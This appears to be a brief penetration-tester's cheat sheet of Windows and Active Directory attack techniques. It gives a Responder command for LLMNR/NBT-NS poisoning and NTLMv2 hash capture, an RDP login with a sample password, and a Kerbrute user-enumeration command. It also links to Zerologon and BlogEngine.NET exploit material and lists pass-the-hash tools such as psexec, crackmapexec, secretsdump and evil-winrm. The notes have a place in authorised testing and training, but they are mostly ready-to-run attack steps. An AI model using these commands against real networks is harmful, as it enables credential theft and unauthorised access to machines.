## SCF attack: malicious file that trigger multicats request for another computers. Responder needed.
**Attack guide**: [https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/].
## LLMNR & NBT-NS POISONING AND CREDENTIAL ACCESS USING RESPONDER
**Run responder/ NTLMv2 hash grabbing**: responder -I [interface] -wF -v
## CONNECT TO RDP
xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP
## Zero Logon    
**Testing script https://github.com/SecuraBV/CVE-2020-1472    
**PoC https://github.com/dirkjanm/CVE-2020-1472    
## Windows user enumeration with Kerbrute    
/kerbrute_linux_amd64 userenum --dc [IP] -d [domain name] usernames.txt    
## CVE-2019-6714 BlogEngine.NET    
**https://blog.gdssecurity.com/labs/2019/3/28/remote-code-execution-in-blogenginenet.html**    
## Pass the HASH
psexec.py    
crackmapexec    
wmiexec    
secretdumps.py    
evil-winrm    



